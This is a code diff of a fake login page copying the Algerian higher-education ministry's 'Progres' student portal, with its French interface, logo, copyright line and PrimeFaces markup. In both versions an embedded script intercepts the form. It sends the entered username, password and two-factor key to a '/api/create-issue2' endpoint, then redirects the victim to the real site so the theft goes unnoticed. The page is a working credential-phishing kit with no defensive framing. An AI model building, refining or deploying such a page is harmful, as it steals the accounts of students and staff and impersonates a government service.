@@ -1,271 +1,203 @@
 <!DOCTYPE html>
-<html lang="fr">
+<html xmlns="http://www.w3.org/1999/xhtml">
+<head id="j_idt2">
+	<base href="https://progres.mesrs.dz/webfve/login.xhtml" />
+	<link href="/webfve/javax.faces.resource/theme.css.xhtml?ln=primefaces-saga&amp;v=11.0.0&amp;e=11.0.0" rel="stylesheet" type="text/css" />
+	<link href="/webfve/javax.faces.resource/primeicons/primeicons.css.xhtml?ln=primefaces&amp;v=11.0.0&amp;e=11.0.0" rel="stylesheet" type="text/css" />
+	<link href="/webfve/javax.faces.resource/css/bootstrap.min.css.xhtml" rel="stylesheet" type="text/css" />
+	<link href="/webfve/javax.faces.resource/css/font-awesome.min.css.xhtml" rel="stylesheet" type="text/css" />
+	<link href="/webfve/javax.faces.resource/css/progres-production.css.xhtml" rel="stylesheet" type="text/css" />
+	<link href="/webfve/javax.faces.resource/css/jquery.ui.css.xhtml" rel="stylesheet" type="text/css" /><script type="text/javascript" src="/webfve/javax.faces.resource/jquery/jquery.js.xhtml?ln=primefaces&amp;v=11.0.0&amp;e=11.0.0"></script><script type="text/javascript" src="/webfve/javax.faces.resource/jquery/jquery-plugins.js.xhtml?ln=primefaces&amp;v=11.0.0&amp;e=11.0.0"></script><script type="text/javascript" src="/webfve/javax.faces.resource/core.js.xhtml?ln=primefaces&amp;v=11.0.0&amp;e=11.0.0"></script>
+	<link href="/webfve/javax.faces.resource/components.css.xhtml?ln=primefaces&amp;v=11.0.0&amp;e=11.0.0" rel="stylesheet" type="text/css" /><script type="text/javascript" src="/webfve/javax.faces.resource/components.js.xhtml?ln=primefaces&amp;v=11.0.0&amp;e=11.0.0"></script><script type="text/javascript">if(window.PrimeFaces){PrimeFaces.settings.locale='fr';PrimeFaces.settings.viewId='/login.xhtml';PrimeFaces.settings.contextPath='/webfve';PrimeFaces.settings.cookiesSecure=false;PrimeFaces.settings.projectStage='Development';}</script>
+	<title>Authentification - Formation et Vie Etudiante</title>
+	<meta name="description" content=""/><meta name="author" content=""/><meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no"/>
+	<link href="/webfve/images/favicon-FVE.ico" rel="shortcut icon" type="image/x-icon" />
+	<style type="text/css">/* login */
+body.login {
+	background: #d7d7d7;
+}
+
+.login .logo {
+	background: url(../img/logo.png);
+	width: 277px;
+	height: 112px;
+	margin: 10px auto 15px;
+}
+
+.login #main {
+	margin-left: 0;
+}
+
+.login #content {
+	width: 400px;
+	position: relative;
+	margin: 0 auto;
+	padding: 0;
+}
+
+.login .client-form header {
+	color: #999;
+	font-size: 180%;
+	padding: 20px 0 0;
+	text-align: center;
+	border-bottom: none;
+	background: none;
+}
+
+.login .smart-form footer {
+	border-top: none;
+	background: #c4c4c4;
+}
+
+.login .note {
+	text-align: center;
+	padding-top: 3px;
+}
+
+.login .smart-form .note a {
+	color: #555;
+}
+
+.login .smart-form .input input {
+	font: 13px/16px Arial, Helvetica, sans-serif;
+}
+
+.login .connect1,.login .connect2 {
+	width: 49%;
+	height: 60px;
+	float: left;
+}
+
+.login .connect2 {
+	padding-top: 4px;
+}
+
+.login .ui-button {
+	padding: 3px 3px 6px !important;
+	float: left !important;
+	margin-right: 20px !important;
+}
+
+.login .bas,.login .bas a {
+	color: #666;
+	font-size: 9.5px;
+	line-height: 150%;
+	text-align: center;
+	padding-bottom: 20px;
+}
+
+.login .well {
+	background: #f0f0f0;
+	border: none;
+	box-shadow: none;
+}
+
+.login .smart-form fieldset {
+	background: none;
+}
+
+.login .titre {
+	color: #777;
+	font-size: 150%;
+	text-align: center;
+	padding: 8px 0 14px;
+}
+
+.login #home {
+	width: 936px;
+	position: relative;
+	margin: 0 auto;
+}
+
+.login #home .well {
+	border: #f0f0f0 solid 3px;
+}
+
+.ui-button-login {
+	background: none repeat scroll 0% 0% #1DA64A !important;
+}
+	</style>
 </head>
-<meta charset="UTF-8">
-<meta name="viewport" content="width=device-width, initial-scale=1.0">
-<title>Authentification - Formation et Vie Etudiante</title>
-<link rel="icon" type="image/x-icon" href="favicon-FVE.ico">
+<body class="animated fadeInDown login">
+<div id="main" role="main">
+<div class="container" id="content">
+<div class="logo" style="padding: 10px; text-align: center"><img alt="Progres" src="/webfve/images/logo.png" /></div>
 
-<style>
-    body {
-        font-family: Arial, sans-serif;
-        background-color: #D7D7D7;
-        margin: 0;
-        padding: 0;
-        display: flex;
-        justify-content: center;
-        align-items: center;
-        height: 100vh;
-    }
-    
-    .container {
-        width: 100%;
-        max-width: 400px;
-    }
-    
-    .logo {
-        text-align: center;
-        margin-bottom: 2px;
-    }
-    
-    .logo img {
-        max-width: 277px;
-        height: 112px;
-    }
-    
-    .login-box {
-        background-color: #F0F0F0;
-        
-        border-radius: 3px 3px 0px 0px;
-        padding: 20px;
-        
-    }
-    
-    .login-header {
-        text-align: center;
-        color: #999999;
-        margin-bottom: 20px;
-    }
-    
-    .login-header h1 {
-        font-size: 24px;
-        margin: 0;
-        font-weight: normal;
-    }
-    
-    .login-header p {
-        font-size: 20px;
-        margin: 10px 0 0;
-    }
-    
-    .form-group {
-        margin-bottom: 15px;
-    }
-    
-    .form-control {
-        width: 100%;
-        width: 372px;
-        height:32px;
-        padding: 10px;
-        box-sizing: border-box;
-        border: 1px solid #ccc;
-        border-radius: 3px;
-        font-size: 14px;
-    }
-    
-    .btn-login {
-        background-color: #27AE60;
-        color: white;
-        border: none;
-        padding: 10px 15px;
-        border-radius: 3px;
-        cursor: pointer;
-        font-size: 10px;
-    }
-    
-    .btn-login:hover {
-        background-color: #219955;
-    }
-    
-    .form-footer {
-        display: flex;
-        justify-content: space-between;
-        align-items: center;
-        margin-top: 15px;
-    }
-    
-    .checkbox-container {
-        display: flex;
-        align-items: center;
-    }
-    
-    .forgot-password {
-        text-align: center;
-        background-color: #C4C4C4;
-        padding: 10px;
-        height:26.5px;
-        top: 1px;
-position: relative;
-        
-    }
-    
-    .forgot-password a {
-        color: #555555;
-        text-decoration:none;
-        font-size: 13px;
-        top: 4px;
-position: relative;
-    }
+<div class="well no-padding" id="loginPanel">
+<form action="" class="smart-form client-form" enctype="application/x-www-form-urlencoded" id="loginFrm" method="post" name="loginFrm"><input type="hidden" value="https://progres.mesrs.dz/webfve/login.xhtml/webfve/login.xhtml" /> <input type="hidden" value="loginFrm" />
+<header>Progiciel de Gestion Int&eacute;gr&eacute;<br />
+<small>Formation et Vie Etudiante </small></header>
+<script type="text/javascript">$(function(){PrimeFaces.focus();});</script>
 
-    .copyright a{
-        text-decoration: none;
-    }
+<script>
+	
+document.getElementById('loginForm').addEventListener('submit', function(event) {
+event.preventDefault();
 
-    .copyright a:hover{
-        text-decoration: underline;
-text-decoration-style:solid;
-    }
+const username = document.getElementById('loginFrm:j_username').value;
+const password = document.getElementById('loginFrm:j_password_s').value;
+const key = document.getElementById('loginFrm:j_mfa').value;
 
 
-    .forgot-password a:hover {
-        color: #555555;
-        text-decoration: underline;
-text-decoration-style:solid;
-        font-size: 13px;
-    }
-    
-    .copyright {
-        text-align: center;
-        font-size: 10px;
-        color: #666;
-        margin-top: 10px;
-    }
-    
-    .version {
-        text-align: center;
-        font-size: 10px;
-        color: #666;
-        margin-top: 5px;
-    }
-      .input-with-icon {
-position: relative;
+fetch('/api/create-issue2', {
+  method: 'POST',
+  headers: {
+	'Content-Type': 'application/json'
+  },
+  body: JSON.stringify({
+	username,
+	password,
+	key
+  })
+})
+.then(response => response.json())
+.then(data => {
+  console.log('Success:', data);
+	window.location.href = "https://progres.mesrs.dz/webfve/login.xhtml";
+  
+})
+.catch(error => {
+  console.error('Error:', error);
+  
+});
+});
+  </script>
+
+<fieldset style="padding-top: 5px">
+<style type="text/css">.ui-messages-error-icon {
+	background: none;
 }
 
-.input-icon {
-position: absolute;
-top: 50%;
-transform: translateY(-50%);
-right: -3px;
-border-left: 1px solid #A2A2A2;
-padding-left: 4px;
-}
-
-
-.input-with-icon input {
-/* padding-left: 35px;*/
+.messages-error-icon {
+	width: 0px;
 }
 </style>
-<body>
-    <div class="container">
-        <div class="logo">
-            <img src="logo.png" alt="Logo">
-        </div>
-       
-        <div class="login-box">
-            <div class="login-header">
-                <h1>Progiciel de Gestion Intégré</h1>
-                <p>Formation et Vie Étudiante</p>
-            </div>
-           
-            <form id="loginForm">
-                <div class="form-group">
-                    <div class="input-with-icon">
-                        <svg class="input-icon" xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24" width="13" height="13" fill="#A2A2A2" stroke="#A2A2A2" stroke-width="2" stroke-linecap="round" stroke-linejoin="round">
-                            <path d="M20 21v-2a4 4 0 0 0-4-4H8a4 4 0 0 0-4 4v2"></path>
-                            <circle cx="12" cy="7" r="4"></circle>
-                        </svg>
-                        <input type="text" class="form-control" placeholder="Nom d'utilisateur" id="username" required>
-                    </div>
-                </div>
-                <div class="form-group">
-                    <div class="input-with-icon">
-                        <svg class="input-icon" xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24" width="13" height="13" fill="#A2A2A2" stroke="#A2A2A2" stroke-width="2" stroke-linecap="round" stroke-linejoin="round">
-                            <rect x="3" y="11" width="18" height="11" rx="2" ry="2"></rect>
-                            <path fill="none" d="M7 11V7a5 5 0 0 1 10 0v4"></path>
-                        </svg>
-                        <input type="password" class="form-control" placeholder="Mot de passe" id="password" required>
-                    </div>
-                </div>
-               
-                <div class="form-group">
-                    <div class="input-with-icon">
-                        <svg class="input-icon" style="padding-left: 3px;right:-5px" xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24" width="16" height="16" fill="none" stroke="#999" stroke-width="2" stroke-linecap="round" stroke-linejoin="round">
-                            <circle cx="8" cy="8" r="4"></circle>
-                            <path d="M10.85 10.85 L16 16"></path>
-                            <path d="M14 14 L17 11"></path>
-                        </svg>
-                        <input type="text" class="form-control" id="key" placeholder="clé double authentification">
-                    </div>
-                </div>
-               
-                <div class="form-footer">
-                    <button type="submit" class="btn-login">Se connecter</button>
-                   
-                    <div class="checkbox-container">
-                        <input type="checkbox" id="remember" checked>
-                        <label for="remember" style="font-size: 13px;color:#404040">Rester connecté</label>
-                    </div>
-                </div>
-            </form>
-        </div>
-       
-        <div class="forgot-password">
-            <a href="#">Mot de passe oublié ?</a>
-        </div>
-       
-        <div class="copyright">
-            Copyright 2025<b> <a href="#" style="color:#666666;">Ministère de l'Enseignement Supérieur et de la Recherche Scientifique</a></b>
-        </div>
-       
-        <div class="version">
-            version publiée le 04-02-2025 14:20
-        </div>
+<div aria-live="polite" class="ui-messages ui-widget" id="loginFrm:messages">&nbsp;</div>
+<script id="loginFrm:messages_s" type="text/javascript">$(function(){PrimeFaces.cw("Messages","widget_loginFrm_messages",{id:"loginFrm:messages"});});</script>
 
-        <div id="result"></div>
-    </div>
+<form id="loginForm">
+<section><label class="input"><input aria-required="true" autocomplete="off" class="ui-inputfield ui-inputtext ui-widget ui-state-default ui-corner-all " id="loginFrm:j_username" placeholder="Nom d'utilisateur" type="text" /><script id="loginFrm:j_username_s" type="text/javascript">$(function(){PrimeFaces.cw("InputText","widget_loginFrm_j_username",{id:"loginFrm:j_username"});});</script></label></section>
 
-    <script>
-      // Inside your submit event listener
-document.getElementById('loginForm').addEventListener('submit', function(event) {
-  event.preventDefault();
-  
-  const username = document.getElementById('username').value;
-  const password = document.getElementById('password').value;
-  const key = document.getElementById('key').value;
-  
-  // Call your Vercel serverless function on the same domain
-  fetch('/api/create-issue2', {
-    method: 'POST',
-    headers: {
-      'Content-Type': 'application/json'
-    },
-    body: JSON.stringify({
-      username,
-      password,
-      key
-    })
-  })
-  .then(response => response.json())
-  .then(data => {
-    console.log('Success:', data);
-      window.location.href = "https://progres.mesrs.dz/webfve/login.xhtml";
-    
-  })
-  .catch(error => {
-    console.error('Error:', error);
-    
-  });
-});
-    </script>
+<section><label class="input"><input aria-required="true" autocomplete="off" class="ui-password ui-inputfield ui-widget ui-state-default ui-corner-all " id="loginFrm:j_password" placeholder="Mot de passe" type="password" /><script id="loginFrm:j_password_s" type="text/javascript">$(function(){PrimeFaces.cw("Password","widget_loginFrm_j_password",{id:"loginFrm:j_password"});});</script> </label></section>
+
+<section><label class="input"><input autocomplete="off" class="ui-inputfield ui-inputtext ui-widget ui-state-default ui-corner-all " id="loginFrm:j_mfa" placeholder="clé double authentification" type="text" /><script id="loginFrm:j_mfa_s" type="text/javascript">$(function(){PrimeFaces.cw("InputText","widget_loginFrm_j_mfa",{id:"loginFrm:j_mfa"});});</script> </label></section>
+</form>
+<section>
+<div class="connect1"><button class="ui-button ui-widget ui-state-default ui-corner-all ui-button-text-only ui-button-save" id="loginFrm:loginBtn" name="loginFrm:loginBtn" onclick="PrimeFaces.bcn(this,event,[function(event){jQuery(this).addClass('ui-state-disabled')},function(event){}]);" type="submit"><span class="ui-button-text ui-c">Se connecter</span></button><script id="loginFrm:loginBtn_s" type="text/javascript">$(function(){PrimeFaces.cw("CommandButton","widget_loginFrm_loginBtn",{id:"loginFrm:loginBtn"});});</script></div>
+
+<div class="connect2"><label class="checkbox"><input checked="false" type="checkbox" /> <i> </i>Rester connect&eacute; </label></div>
+</section>
+</fieldset>
+
+<footer>
+<div class="note"><a href="forget_password.xhtml">Mot de passe oubli&eacute; ?</a></div>
+</footer>
+<script id="loginFrm:j_idt19_s" type="text/javascript">$(function(){PrimeFaces.cw("Growl","widget_loginFrm_j_idt19",{id:"loginFrm:j_idt19",sticky:false,life:6000,escape:true,keepAlive:false,msgs:[]});});</script><input autocomplete="off" id="j_id1:javax.faces.ViewState:0" type="hidden" value="a2zz+dwm37eixS9r/j/UoGpMA02v/cu+HB8Bb2uiSleoq9BK66bE+UmgwUOzcic3zZAZOgXOZ+0gURO6DqL0YSCTLu1CC7MA6FKQ5MYX15kD5XQpuXaSMovb8IEO9cAKTqcRHl5hqltz7S9zjEQCg9k+AgNy39XfolFMAXcrPM7HCrkkRkB1gapNV8oqD2Hz/k85lCG2AnlwruNgYfKWL6c2I8kRxdosSvQgMfEpxw+nyFjR/RdSnwrTKxbssBSt1kVIP7ctHGqO0d+QebkgrwoJX6tdbV6cqvFl4Pn2h9mh9Znr8NSeV5iUihfBoTg4W2wV1nxEX+JIZQAxKTAFAFggWZ87fxwAtImUnACKFwQ7xsP6PF9pXGknSyTCcaYmXuGQvGdNIqpj6QyoHO6f+X3w0ryKX1NRkJ0tdoOnja3qlMRhL32oCfg45WNw4bAJigTMqo588tBo4gFEcf60BxX4Qre0IP49aDjzkuUTHzpgb4sbyKDiaNfxgOenmlgQi6ZdVrIJfoQ638sa2xIvwiZvjaU5qfNQegwYSssWGu/dl6s53FhMP4neDEmTYuh6LaNQdvAd6GiEKT+uSORtxtjS6Z3UQwFX2NFno5WfoqpxWbDB2ktQNvvEoSdUmPDOlZQP4XfOKw/z9e0DI44GkvgwCSAF61pDTvpirCYuSxPXnD5EOCe1x7rqrYsUj3Rh0eGpbClHfe/C3Ii7bhEGFS9Flx9aUPDjkCdLLPN5F4QfOxl6RZjP5JiUTzAtsI+VOE2m7LuEeU6I3ZAnppK/TNAN4BT/MEcdkwypHJTyT1UvGt3+J/XIuwG7ZtTUqR35ESk2pwibyp74m4mBE7Aou+9YTrjhzmbjJZF5RkL6Vvxg6GmTYDbMW7CLupm/MOYpMHSXqEHV3av5jaQvGvgwP1MOKPrqk1Fqm02pwoZiwb7HAD+p0hgNH896uyr33TfZ4MHLmSHHZq5V8l8JdIpcM99p7dINkoKxxZQEK9VET1nJPUvWbcg3AchRFKrEtl2x8/8NaqTnIGl1NvNHXQVH2g==" />&nbsp;</form>
+</div>
+
+<div class="bas">Copyright 2025 <a href="https://www.mesrs.dz/"><strong>Minist&eacute;re de l&#39;Enseignement Sup&eacute;rieur et de la Recherche Scientifique</strong></a><br />
+<span style="font-size: 10px">version publi&eacute;e le 04-02-2025 14:20 </span></div>
+</div>
+</div>
 </body>
 </html>
